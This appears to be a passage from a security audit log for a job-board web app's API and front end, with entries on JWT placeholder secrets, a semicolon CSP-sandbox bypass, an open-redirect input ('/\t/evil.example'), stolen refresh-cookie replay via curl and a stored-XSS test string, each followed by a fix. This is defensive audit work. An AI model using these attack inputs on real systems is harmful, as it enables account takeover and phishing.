- **Failure scenario:** An operator follows README ('cp .env.example .env', self-hosted section) and sets NODE_ENV=production without replacing the secrets. env.ts superRefine (lines 114-123) only checks length >= 32 and inequality. The new placeholders are 49 and 46 chars and differ, so the server boots with publicly known HS256 secrets. Anyone can then sign access/refresh tokens (refresh with v:0) for any user id that is exposed, e.g. review userId kept per D-017, and impersonate that user. The old placeholders (29 and 21 chars) would have failed this guard, so the audit's doc edit disabled the safety net D-008 relies on. ISSUE-096 cites 'e2e (32+ belgili sirlar bilan) PASS' (ISSUES.md:2176), but e2e only boots with valid secrets. The guard's rejection path is never exercised.
- **Evidence:** git diff HEAD apps/api/.env.example: JWT_ACCESS_SECRET="kamida-8-belgi-tasodifiy-satr" -> "kamida-32-belgili-tasodifiy-satr-shu-yerga-yozing" (len=49), JWT_REFRESH_SECRET -> "boshqa-kamida-32-belgili-tasodifiy-satr-yozing" (len=46). env.ts:116-123 checks only `cfg[key].length < 32` and `JWT_ACCESS_SECRET === JWT_REFRESH_SECRET`. e2e-check.mjs:72-73 always passes valid 37-char secrets.
- **Recommended fix:** Leave the placeholders empty, or keep them obviously short/invalid so production refuses to start. Additionally reject known placeholder substrings (e.g. 'tasodifiy-satr') in env.ts when NODE_ENV=production. Add an automated startup check that spawns dist/server.js with NODE_ENV=production and short, equal or placeholder secrets and asserts exit code 1 with the env error message.
- **Bajarilgan fix:** Production'da hujjatdagi namunaviy JWT sirlari (`.env.example` va umumiy markerlar) rad etiladi; development o'zgarmagan.
- **Test/dalil:** C2 agenti `env.ts` ni tsx bilan tekshirdi (namuna qiymatlar exit 1, e2e sirlari OK); e2e 94/94 PASS (yakuniy build) (production rejimda)

### ISSUE-120

**`[ISSUE-003/040]` WebSocket e2e tekshiruvi bo'sh edi: global unhandledRejection handler `/health` 200 ni kafolatlardi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/scripts/e2e-check.mjs:1178`
- **Agent sarlavhasi:** [ISSUE-003/040] WebSocket e2e check is vacuous: global unhandledRejection handler guarantees /health 200
- **Failure scenario:** Delete the input guards in chat.routes.ts (lines 178-182: object/type/isObjectId checks, or line 200 typeof body) or the token bucket (`if (!allow()) return;` line 183). Malformed frames then reach Prisma and throw P2023/TypeError, but handle() rejections are caught by `.catch` at chat.routes.ts:209. participantsOf also re-checks isObjectId at line 16, and anything else lands in the new process-level handler at server.ts:269, which only logs. /health stays 200, the 1009 close comes from maxPayload, and the invalid-token close is 4401, so the check still passes 78/78. ISSUES.md:208 still cites it as FIXED evidence ('server tirik') for the P0. The token bucket, the connect-time block check (chat.routes.ts:144-150) and expiry close (line 155) have no assertion at all, although ISSUE-040 is marked FIXED on this check.
- **Evidence:** e2e-check.mjs:1185-1195 sends malformed frames then only asserts close code 1009 and `/health` 200. server.ts:269-271 `process.on("unhandledRejection", ...)` logs and continues. chat.routes.ts:207-210 wraps handle() in .catch. No e2e line counts persisted messages under burst or connects a pre-blocked user.
- **Recommended fix:** Assert behaviour instead of liveness. (1) At the end of the run, fail if `log` contains 'Tutilmagan promise xatosi' or 'WS xabarini qayta ishlab bo'lmadi' for the malformed frames. (2) After the malformed frames, send a valid message on a fresh socket and assert delivery. (3) Burst ~30 messages within 1 s and assert prisma.message.count increased by <= 20. (4) Block a user in the DB, then connect with their still-valid access token and expect close 4403.
- **Bajarilgan fix:** e2e `[ISSUE-003/040]`: noto'g'ri kadrlardan keyin server logida xato markerlari yo'qligi va yangi socketda haqiqiy xabar yetkazilishi tekshiriladi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[ISSUE-003/040] [PHASE6-U8]`

### ISSUE-121

**Web P0/P1 fix'larida avtomatik regressiya tekshiruvi yo'q edi, dalil sifatida ko'rsatilgan FINAL_AUDIT.md hali yaratilmagan edi**

- **Severity:** P2
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** PARTIAL
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/web/src/components/JsonLd.tsx:12`
- **Agent sarlavhasi:** Web P0/P1 fixes have no automated regression check and their cited evidence file FINAL_AUDIT.md does not exist
- **Failure scenario:** Someone swaps `serializeJsonLd(data)` back to `JSON.stringify(data)` in JsonLd.tsx:28, or reintroduces the `get(path, token, fallback)` pattern for the resume/company profile. Web typecheck/build still pass, so the stored XSS (ISSUE-005, P0) or the data-loss overwrite (ISSUE-017/018, P1) returns silently while ISSUES.md reports FIXED. ISSUES.md rows for ISSUE-015/016/020/021/022/023/045/048/052/053/081 and DECISIONS D-023/D-024/D-025/D-026/D-031 point to 'brauzer regressiyasi — FINAL_AUDIT.md'. ARCHITECTURE_AUDIT.md:13 and D-001 list that file as created, but it is not in the repo, so the stated verification is unbacked.
- **Evidence:** apps/web/package.json has no test/vitest/jest/playwright script or dependency. `find . -name FINAL_AUDIT.md` returns nothing, and `ls docs/audit` shows only ARCHITECTURE_AUDIT.md, DECISIONS.md, ISSUES.md, maps, raw. DECISIONS.md:258,269,280,291,345 cite FINAL_AUDIT.md. ISSUES.md ISSUE-005 row: 'avtomatik XSS testi yo'q (frontend test runner yo'q)'. serializeJsonLd is a pure exported function (JsonLd.tsx:12-21), trivially unit-testable.
- **Recommended fix:** Add a node --test (no new dependency) for serializeJsonLd: the output contains no '</' or U+2028, and JSON.parse round-trips. Alternatively, the API e2e can SSR-fetch a vacancy page whose title contains '</script><script>' and assert the literal does not appear. Add a minimal test for resume/company load-error handling (fetcher throws, form not rendered). Either create FINAL_AUDIT.md with the actual browser-check results or change the evidence text to 'NOT TESTED'.
- **Bajarilgan fix:** `apps/web/scripts/unit-check.mjs` (`npm run test:unit`, yangi dependency'siz): `serializeJsonLd`, `safeReturnTo`, `safeInternalUrl`. Rezyume va kompaniya profilini xato holatda ustidan yozish (ISSUE-017/018) uchun avtomatik test yo'q.
- **Test/dalil:** unit-check 3/3 PASS

### ISSUE-122

**ISSUE-010 va ISSUE-013 (P1) fix'ni sinaydigan testsiz FIXED deb belgilangan; ISSUE-010 uchun qaror yozuvi yo'q edi**

- **Severity:** P2
- **Verdict:** PLAUSIBLE (agent topgan, mustaqil tekshirilmagan)
- **Holat:** NOT FIXED
- **Yo'nalish:** tests-docs-consistency
- **Fayl:** `apps/api/src/modules/telegram/telegram.service.ts:261`
- **Agent sarlavhasi:** ISSUE-010 and ISSUE-013 (P1) marked FIXED with no test that exercises the fix; ISSUE-010 has no decision record
- **Failure scenario:** ISSUE-010: removing the `entry.chatId === chatId` binding (line 261), or reverting handleLoginStart to set status 'confirmed' directly (the pre-audit phishing behaviour), breaks no test. e2e runs with TELEGRAM_BOT_TOKEN="", and handleLoginStart/handleCallbackQuery are module-private. The fix changes a user-facing auth flow (extra confirm/deny button, chat binding), yet DECISIONS.md has no entry for ISSUE-010 (grep finds none). ISSUE-013: ISSUES.md:430 cites 'e2e bildirishnoma va [ISSUE-054] PASS', but those checks assert URL sanitisation and delivery (e2e 829-862, 1458-1469). If notify() starts rejecting again, the global unhandledRejection handler (server.ts:269) swallows it and nothing fails.
- **Evidence:** ISSUES.md:371 ISSUE-010 'API typecheck/build PASS; NOT RUN — Telegram bot tokeni test muhitida yo'q'. DECISIONS.md ISSUE-ID grep includes 013 (D-021) but not 010. telegram.service.ts:251-288 handleCallbackQuery is not exported. e2e-check.mjs:78 TELEGRAM_BOT_TOKEN "".
- **Recommended fix:** Extract the login-token state machine (createLoginToken / handleLoginStart / handleCallbackQuery / consumeLoginToken) with an injectable Telegram sender and test it with node --test: a deep link alone does not confirm; a callback from another chat is rejected; deny deletes the token. For notify(), stub a failing channel or prisma.notification.create and assert that the caller resolves and nothing is logged as unhandledRejection. Add a D-0xx entry for the ISSUE-010 flow change.
- **Bajarilgan fix:** Telegram orqali kirish holat mashinasi uchun test yozilmadi (D-039).
- **Test/dalil:** —

### ISSUE-106

**`/uploads/` CSP sandbox'ini yo'lga `;` qo'shib chetlab o'tish mumkin edi (eski SVG logolardagi skript ishlardi)**

- **Severity:** P3 (agent bahosi: P2)
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/server.ts:148`
- **Agent sarlavhasi:** /uploads/ CSP sandbox can be skipped with a ';' in the path, so script in legacy SVG logos runs again
- **Failure scenario:** 1. Before the audit, logo upload accepted image/svg+xml and saved `company-logo-<companyId>-<ms>.svg` (git HEAD companies.routes.ts:19,139). D-013 keeps old files, and the public company.logoUrl still points to them. 2. Fastify 4.29.1 defaults `useSemicolonDelimiter: true`, so find-my-way cuts the path at ';'. GET `/uploads/company-logo-<id>-<ms>.svg;.pdf` reaches @fastify/static with `params['*']` = the .svg file, which is served as image/svg+xml. 3. The onSend hook checks the raw `req.url.split('?')[0]`, which ends in `.pdf`, so it does not set the sandbox CSP. 4. Helmet's API CSP (`script-src 'self' 'unsafe-inline'`) remains, so an inline <script> in the SVG runs on the API origin. That is the ISSUE-002 condition. With the documented split deploy (Vercel web, Railway API), the CORS 403 on a POST from the API origin blocks /api/auth/refresh, leaving phishing and script execution on the API domain. If web and API ever share one origin (the self-hosting option in D-031), it becomes full account takeover. Exploitation needs the legacy SVGs to still be on a persistent UPLOAD_DIR volume.
- **Evidence:** apps/api/src/server.ts:148 `if (!req.url.split("?")[0].toLowerCase().endsWith(".pdf"))`: decides on the raw URL. server.ts:154 registers fastifyStatic for /uploads/. server.ts:59 sets no useSemicolonDelimiter. Router: - apps/api/node_modules/fastify/lib/configValidator.js:72-73 `data.useSemicolonDelimiter = true`, and defaultInitOptions contains `"useSemicolonDelimiter":true`. - fastify.js:186 `useSemicolonDelimiter: options.useSemicolonDelimiter ?? defaultInitOptions.useSemicolonDelimiter`. - lib/route.js:62 `FindMyWay(options.config)` and :101 `routing: router.lookup.bind(router)`. - find-my-way/index.js:528 `this.find(req.method, req.url, constraints)` and :576 `safeDecodeURI(path, this.useSemicolonDelimiter)`. - find-my-way/lib/url-sanitizer.js: `charCode === 59 && useSemicolonDelimiter` splits the path. - fastify/lib/request.js:155-157 `url` getter returns `this.raw.url`. Static serving: - @fastify/static/index.js wildcard handler `pumpSendToReply(req, reply, '/' + req.params['*'], sendOptions.root)`. - @fastify/send/lib/SendStream.js:840 `mime.getType(path)`, so the file is served as image/svg+xml. Old files: - `git show HEAD:apps/api/src/modules/companies/companies.routes.ts` lines 15-20 map `"image/svg+xml": "svg"`, and :139 saves `company-logo-${company.id}-${Date.now()}.${ext}`. - docs/audit/DECISIONS.md D-013 Risk: "Demo va eski fayllar o'chirilmaydi" (demo and old files are not deleted). - e2e-check.mjs [ISSUE-002] only fetches `${BASE}${ok.body.logoUrl}` (the plain .png URL). Why impact is limited: - server.ts:121-123: a non-allowed Origin goes to cb(Error 403) in onRequest. - auth.routes.ts:41-43: refresh cookie `path: "/api/auth"`, SameSite=None in production. - auth.routes.ts:76 and :95: refresh and logout are POST; the only /api/auth GET is /me, which requires Bearer (auth-guard.ts:12-22). - The only post-audit upload writer is saveUpload (articles.admin.routes.ts:290, companies.routes.ts:155, profile.routes.ts:109), limited to png/jpg/webp/pdf. - apps/api/uploads holds 0 company-logo-*.svg files; the demo SVGs escape their text (demo-media.ts:30 escapeXml, used at :44 and :62). Suggested fix: base the CSP decision on the file actually served, e.g. skip the sandbox only when `String(reply.getHeader('content-type')).startsWith('application/pdf')`, or cut req.url at the first [;?#]. Alternatively set `useSemicolonDelimiter: false`, or use @fastify/static allowedPath to block *.svg other than known demo- files. Also quarantine old company-logo-*.svg files.
- **Recommended fix:** Base the decision on the file actually served, not the raw URL. In onSend, set the sandbox CSP unless `reply.getHeader('content-type')` starts with application/pdf, or cut req.url at the first `;`, `?` or `#`. Consider setting `useSemicolonDelimiter: false`. Also remove or quarantine legacy *.svg uploads, or use @fastify/static `allowedPath` to serve only png/jpg/webp/pdf (plus known demo- files).
- **Bajarilgan fix:** `/uploads/` javoblarida CSP sandbox qarori URL oxiri emas, haqiqiy `Content-Type` bo'yicha (PDF'dan tashqari hammasiga); `nosniff` doim.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-V3]`

### ISSUE-110

**Obuna qidiruvdan oldin band qilinardi: qidiruv xato bersa bildirishnoma oynasi yo'qolardi (regressiya)**

- **Severity:** P3 (agent bahosi: P2)
- **Verdict:** CONFIRMED (alohida verify agenti topilmani rad etishga urinib, tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/alerts/alerts.service.ts:179`
- **Agent sarlavhasi:** Claiming a subscription before searching loses its notification window if the search throws (regression)
- **Failure scenario:** Subscription S has lastNotifiedAt 09:00, and 3 matching vacancies were published after that. The sweep claims S, moving lastNotifiedAt to 10:00. Then `listVacancies(query)` throws: a Mongo pool timeout, primary stepdown or transient Prisma error. The exception leaves sweep() and is only logged by tick(). On the next tick, since = 10:00, so the 3 vacancies published between 09:00 and 10:00 are never reported to S. Before the audit, lastNotifiedAt was written after listVacancies (see git diff), so a failure left `since` unchanged and the next tick retried.
- **Evidence:** apps/api/src/modules/alerts/alerts.service.ts:171-179 (current): ``` const claimed = await prisma.savedSearch.updateMany({ where: { id: search.id, lastNotifiedAt: since }, data: { lastNotifiedAt: now }, }); if (claimed.count === 0) continue; const params = parseQueryParams(search.queryParams); const query: VacancyListQuery = { ...params, sort: "date", page: 1, pageSize: 20, publishedAfter: since }; const { items } = await listVacancies(query); ``` There is no try/catch around this block. tick() at lines 231-240 only runs `console.warn`. Pre-audit version (`git show HEAD:apps/api/src/modules/alerts/alerts.service.ts`): `const { items } = await listVacancies(query);` ran first, then `await prisma.savedSearch.update({ where: { id: search.id }, data: { lastNotifiedAt: now } });`. A throw therefore left lastNotifiedAt untouched. apps/api/src/modules/vacancies/vacancies.service.ts: - Line 281: `engineCanFilter = ... && !query.publishedAfter`, so the search always goes to MongoDB. - Lines 327-338: `Promise.all([prisma.vacancy.findMany(...), prisma.vacancy.count({ where })])`, which can reject. - Line 153: `publishedAt: { gt: query.publishedAfter }`, so the next tick cannot see the lost window. apps/api/src/common/prisma.ts: plain `new PrismaClient()` with no retry wrapper. Callers: admin.routes.ts:520 (`runAlertSweep()` returns 500 on throw), scripts/run-alerts.ts:12, server.ts:263 (scheduler). docs/audit/DECISIONS.md:196 mentions only "optimistik claim + qayta kirish qulfi" and does not document losing notifications on search failure.
- **Recommended fix:** Wrap each subscription's search and notify in try/catch. On failure, roll back with `updateMany({ where: { id, lastNotifiedAt: claimedAt }, data: { lastNotifiedAt: since } })` and continue with the next subscription. Alternatively, use a separate lease field and advance lastNotifiedAt only after the search succeeds.
- **Bajarilgan fix:** Qidiruv yoki xabar qurishda xato bo'lsa obunaning `lastNotifiedAt` qiymati qaytariladi, sweep keyingi obunaga o'tadi.
- **Test/dalil:** API typecheck/build PASS; reviewer kodni tekshirdi. NOT TESTED: baza nosozligi simulyatsiya qilinmadi

### ISSUE-123

**Logout allaqachon bekor qilingan refresh tokenni qabul qilardi: eski o'g'irlangan cookie qurbonni qayta-qayta hamma joydan chiqara olardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/modules/auth/auth.routes.ts:99`
- **Agent sarlavhasi:** Logout accepts already-revoked refresh tokens, so an old stolen cookie can repeatedly log the victim out everywhere
- **Failure scenario:** 1. The attacker has a copied refresh cookie with v=0 (the ISSUE-041 threat model). 2. The victim logs out, which sets v=1. The attacker's token no longer refreshes. 3. The attacker sends POST /api/auth/logout with `Cookie: refreshToken=<old token>` from curl. There is no Origin header, so CORS lets it through. 4. verifyRefreshToken checks only signature and expiry, not `v`, so revokeUserSessions increments tokenVersion again. 5. All of the victim's current sessions on every device end at their next refresh. This can be repeated for the old token's full 30-day lifetime, even after the victim logs in again. Separately, D-009 says logout closes open WebSockets, but the logout route never calls closeUserSockets.
- **Evidence:** auth.routes.ts:95-107: `const { sub } = verifyRefreshToken(refreshToken); await revokeUserSessions(sub);` with no `payload.v === user.tokenVersion` comparison. refreshSession (auth.service.ts:140) does make that comparison. The e2e [ISSUE-041/035] check (e2e-check.mjs:1471-1504) only covers the happy path.
- **Recommended fix:** In logout, compare `payload.v` with `user.tokenVersion ?? 0` and revoke only when they match. Otherwise just clear the cookie. If logging out everywhere is intended, also call closeUserSockets(sub, 4401) so other tabs refresh and fall back to guest.
- **Bajarilgan fix:** Logout refresh token `v` joriy versiyaga teng bo'lsagina seanslarni bekor qiladi; bekor qilishda foydalanuvchining ochiq WebSocket'lari 4401 bilan yopiladi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U11]`, `[ISSUE-041/035]`

### ISSUE-124

**`safeInternalPath` "/<TAB>/evil.com" ni qabul qilardi — brauzer uni tashqi manzilga aylantiradi (open redirect)**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-authz-security
- **Fayl:** `apps/api/src/common/validation.ts:28`
- **Agent sarlavhasi:** safeInternalPath accepts '/<TAB>/evil.com', which browsers turn into an external protocol-relative URL (open redirect)
- **Failure scenario:** 1. An admin broadcast is sent with url "/\t/evil.example". admin.routes.ts:529 only enforces z.string().max(200). 2. safeInternalPath lets it through because the second character is a tab, not '/'. It is stored in payload.url and returned by /api/notifications. The web safeInternalUrl (lib/notifications/adapter.ts) uses the same check. 3. The WHATWG URL parser strips ASCII tab and newline, so the href in NotificationBell (`l(n.url)`, line 70) and the service worker's client.navigate/openWindow(target) (public/sw.js:40) resolve to //evil.example. 4. Users are sent to an external site from a trusted notification. Variants such as "/\n\\evil.example" also work. Today only admin input reaches this, hence low severity.
- **Evidence:** validation.ts:25-30 checks only `startsWith("//")` and `startsWith("/\\")` after trim(), and trim() does not remove characters inside the string. admin.routes.ts:540: `safeInternalPath(url) ?? "/"`. notifications.routes.ts:47-50 reuses the same function. The client does the same check in web/src/lib/notifications/adapter.ts safeInternalUrl.
- **Recommended fix:** Reject control characters, whitespace and backslashes anywhere in the value (e.g. `/[\x00- \s\\]/`) before the prefix checks. Alternatively, validate with `new URL(v, 'https://x.invalid').origin === 'https://x.invalid'`. Mirror the change in the web safeInternalUrl.
- **Bajarilgan fix:** API `safeInternalPath` va web `safeInternalUrl` boshqaruv belgilari (kod < 32, 127) va backslash bor qiymatni rad etadi.
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U13]`; unit-check `safeInternalUrl` PASS

### ISSUE-125

**Yagona global ma'lumot versiyasi: har ariza yozuvi 20k qatorli maosh to'plamini qayta yuklatib, 5 daqiqalik keshni befoyda qilardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/common/cache.ts:23`
- **Agent sarlavhasi:** A single global data version means every application or vacancy write reloads the 20k-row salary dataset, defeating the 5-minute cache
- **Failure scenario:** At target scale, applications arrive every few seconds at peak. Each `POST /api/vacancies/:id/apply` calls bumpDataVersion() (applications.routes.ts:100), which invalidates every cached() entry, including salary.stats `loadDataset`. Applications do not affect salary statistics. The next /api/stats/salary request re-reads up to 20,000 active vacancies with category and region joins. So the ISSUE-051 cache is effectively off during busy periods, and each new version starts its own load even while the previous one is still running. PUT /api/vacancies/:id also bumps unconditionally, including edits to drafts or archived vacancies (vacancies.routes.ts:218).
- **Evidence:** cache.ts:13-23: one module-level `version`, and each entry is reloaded when `entry.version !== version`. Both `homeStats` (stats.routes.ts:12) and `loadDataset` (salary.stats.ts:166-197) use it. Bump call sites: applications.routes.ts:100, vacancies.routes.ts:218/264/290, vacancies.service.ts:554, admin.routes.ts:202/304, companies.routes.ts:137/254.
- **Recommended fix:** Key versions by domain, for example `bumpDataVersion('vacancies' | 'applications' | 'companies')`, and have each cached() subscribe only to the domains it reads. The salary dataset only needs active-vacancy changes. Skip the bump for writes to non-active vacancies that did not change status.
- **Bajarilgan fix:** Ariza yozuvi kesh versiyasini oshirmaydi: maosh statistikasi va kompaniyalar katalogi keshi ariza bilan bekor bo'lmaydi; bosh sahifadagi bugungi arizalar soni 60 s gacha kechikishi mumkin.
- **Test/dalil:** API typecheck/build PASS; e2e 94/94 PASS (yakuniy build)

### ISSUE-126

**`reindexAll` Prisma cursor sahifalashi: chegara vakansiyasi o'chirilsa qolgan faol vakansiyalar Meilisearch'dan o'chirilardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/search/search.service.ts:194`
- **Agent sarlavhasi:** reindexAll uses Prisma cursor paging; if the cursor vacancy is hard-deleted mid-scan, the stale pass deletes all remaining active vacancies from Meilisearch
- **Failure scenario:** A reindex runs at startup (warmSearchIndex) or from the admin button. Batch k ends at vacancy X, and while `index.addDocuments(batch)` uploads, the employer deletes X (DELETE /api/vacancies/:id, which is allowed when it has no applications). The next `findMany({ cursor: { id: X }, skip: 1 })` returns [] because Prisma cursor paging joins the cursor document (the engine contains `cursor_inner`/`cursor_condition`), so the loop breaks. `activeIds` now holds only the first k×1000 ids. The stale pass then sees every indexed id above X as not active and calls deleteDocuments on them. Text searches (the Meili path) silently miss most active vacancies until the next reindex or restart. The same early stop affects the alert sweep (alerts.service.ts:136-142, when a user deletes a saved search) and the broadcast (admin.routes.ts:551-557), though there it only ends the run early.
- **Evidence:** search.service.ts: `...(cursor ? { cursor: { id: cursor }, skip: 1 } : {})` with `if (batch.length === 0) break` (lines ~189-196), then `if (!activeIds.has(doc.id)) stale.push(doc.id)` and `index.deleteDocuments(stale)` (lines ~203-209). This code is new in the audit; the old version did deleteAll plus add. The trigger window is narrow, but the impact is a large-scale index loss.
- **Recommended fix:** Page with a plain key range instead of Prisma `cursor`: `where: { status: 'active', ...(lastId ? { id: { gt: lastId } } : {}) }, orderBy: { id: 'asc' }, take`. A deleted boundary record then cannot end the scan. Apply the same change to the alert sweep and broadcast loops.
- **Bajarilgan fix:** Obuna sweep, ommaviy xabar va Meilisearch reindex keyset sahifalash bilan (`id > lastId`).
- **Test/dalil:** API typecheck/build PASS; e2e 94/94 PASS (yakuniy build): `[ISSUE-054]`. NOT RUN: reindex (Meilisearch test muhitida yo'q)

### ISSUE-127

**Maosh saralashi va filtri faqat `salaryMax` yozilgan vakansiyalarni maoshsiz deb hisoblaydi, maosh statistikasi esa hisobga oladi**

- **Severity:** P3
- **Verdict:** PLAUSIBLE (agent topgan, mustaqil tekshirilmagan)
- **Holat:** WONT FIX
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:240`
- **Agent sarlavhasi:** Salary sort and filter treat 'up to X' vacancies (only salaryMax set) as having no salary, while salary stats count them
- **Failure scenario:** The API accepts `salaryMin: null, salaryMax: 15000000` (vacancies.routes.ts:51,67-68). With `sort=salary_desc`, that vacancy goes to the unpriced partition and is listed after every priced vacancy, among those without a salary and sorted by date. With `salary=10000000`, it is excluded, including on the Meili path where `salaryMin` is null. Yet /api/stats/salary counts it as 15M through midpoint() (salary.stats.ts:79-82,184). The ISSUE-033 rewrite of the split kept `salaryMin: { not: null }` as the only definition of 'has a salary'.
- **Evidence:** priced: `{ salaryMin: { not: null } }` (line 240); unpriced: `{ salaryMin: null } | { isSet: false }` (line 243). The filter only checks `salaryMin` gte/lte (lines 161-164). search.service.ts toDoc indexes only salaryMin for filtering.
- **Recommended fix:** Define 'has a salary' as `salaryMin` or `salaryMax` being set (and not hidden). Sort on a stored effective value such as `salarySort = salaryMin ?? salaryMax`, written on create and update. For the range filter, match when [min, max] overlaps the requested range, and index the same fields in Meilisearch.
- **Bajarilgan fix:** Faqat `salaryMax` yozilgan e'lonlar maosh saralashi va filtrida maoshsiz guruhda qoladi (D-038, product qarori).
- **Test/dalil:** —

### ISSUE-128

**Ochiq vakansiya detail'i har ko'rishda kompaniyaning barcha tasdiqlangan sharhlarini chegarasiz yuklardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.service.ts:435`
- **Agent sarlavhasi:** Public vacancy detail still loads every approved review of the company (unbounded) on each view
- **Failure scenario:** A company has 3,000 approved reviews and 100 active vacancies. Every GET /api/vacancies/:slug, including SSR detail renders and crawlers, reads 3,000 review documents and returns them in the JSON just so the web can average the ratings. ISSUE-047 capped reviews at 200 and added an aggregate `reviewSummary` on the company page, but the sibling detail endpoint was left unbounded and grows linearly with review count.
- **Evidence:** `company: { select: { ...PUBLIC_COMPANY_SELECT, reviews: { where: { status: 'approved' }, select: { rating: true } } } }` (line 435) has no `take`. The web computes the rating from that array in apps/web/src/lib/vacancies/detail.ts:162-176 (`ratingOf(company.reviews)`).
- **Recommended fix:** Compute `reviewSummary` with `prisma.companyReview.aggregate({ _avg, _count })`, as companies.routes.ts:215-219 already does. Drop the `reviews` array from the select and update detail.ts to read `reviewSummary`.
- **Bajarilgan fix:** Vakansiya detail javobida sharhlar ro'yxati o'rniga bitta aggregate bilan `company.reviewSummary`; web shuni o'qiydi (eski javob shakli uchun fallback bor).
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U17]`, `GET /api/vacancies/:slug`; web typecheck/build PASS

### ISSUE-129

**`PUT /api/vacancies/:id` da eski masofaviy fallback yo'q edi: PATCH status qabul qiladigan yozuvni rad etardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/vacancies/vacancies.routes.ts:180`
- **Agent sarlavhasi:** PUT /api/vacancies/:id has no legacy remote fallback, so it rejects records that PATCH /status accepts
- **Failure scenario:** Take a legacy vacancy with `employment_type: 'remote'`, no `workplace_type`, status archived. `PATCH /status {status:'active'}` succeeds because workplaceType falls back to 'remote' (line 252). A partial `PUT { title: 'Fix typo' }` or `PUT { isSalaryHidden: true }` from an API client or admin tool, with no workplaceType in the body, returns 400 'workplaceType: Ish joylashuvini tanlang' for the same record. The web VacancyForm does not hit this because form.ts:128 applies the same fallback on the client and always sends workplaceType. The API's partial-update contract (`updateSchema = createSchema.partial()`, and web `updateVacancy(input: Partial<...>)`) is broken for legacy remote data.
- **Evidence:** PUT: `workplaceType: body.workplaceType ?? vacancy.workplaceType` (line 180). PATCH: `vacancy.workplaceType ?? (vacancy.employmentType === 'remote' ? 'remote' : null)` (line 252).
- **Recommended fix:** Use the same fallback expression in PUT, preferably through a shared helper in vacancies.rules.ts. Optionally write the derived `workplaceType: 'remote'` back to the record when it is missing.
- **Bajarilgan fix:** `effectiveWorkplaceType` PUT va PATCH status yo'llarida umumiy (eski `employmentType=remote` fallback).
- **Test/dalil:** e2e 94/94 PASS (yakuniy build): `[PHASE6-U18]`, `[ISSUE-025/024/059]`

### ISSUE-130

**Admin overview "bugun" ni 24 soatlik oynadan, grafik va bosh sahifa esa Toshkent kunidan hisoblardi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** api-data-performance
- **Fayl:** `apps/api/src/modules/admin/admin.routes.ts:89`
- **Agent sarlavhasi:** Admin overview 'today' uses a rolling 24h window while the chart and the home stats use the Tashkent calendar day
- **Failure scenario:** At 09:00 Tashkent time, the admin card '<N> today' (web admin/+Page.tsx:105) counts applications since 09:00 yesterday. The last chart bar for the same day counts only since 00:00 Tashkent (lines 98-111), and the home page /api/stats 'applications today' uses startOfTashkentDay(). The three 'today' figures disagree; the ISSUE-052 fix converted the chart and home stats but not this counter.
- **Evidence:** `const dayAgo = new Date(now.getTime() - DAY_MS)` (line 61), `prisma.application.count({ where: { createdAt: { gte: dayAgo } } })` (line 89); `since = startOfTashkentDay(now) - 13*DAY_MS` and `tashkentDayKey` buckets (lines 98-111); stats.routes.ts:16 uses `startOfTashkentDay()`.
- **Recommended fix:** Use `startOfTashkentDay(now.getTime())` for `applications.today`, or rename the field and label to 'last 24 hours'.
- **Bajarilgan fix:** Admin overview "bugun" arizalari Toshkent kuni boshidan (grafik va bosh sahifa bilan bir xil).
- **Test/dalil:** API typecheck/build PASS. NOT TESTED: avtomatik test yo'q

### ISSUE-131

**`logout()` dan keyin tugagan refresh token xotira va localStorage'ga qaytib yozilardi — chiqish qayta yuklashda saqlanmasdi**

- **Severity:** P3
- **Verdict:** CONFIRMED-C (agent tekshirmagan; lead auditor fix'dan oldin kodni o'qib tasdiqladi)
- **Holat:** FIXED
- **Yo'nalish:** web-session-realtime
- **Fayl:** `apps/web/src/components/AuthContext.tsx:160`
- **Agent sarlavhasi:** A refresh that finishes after logout() puts the token back in memory and localStorage, so logout does not stick on reload
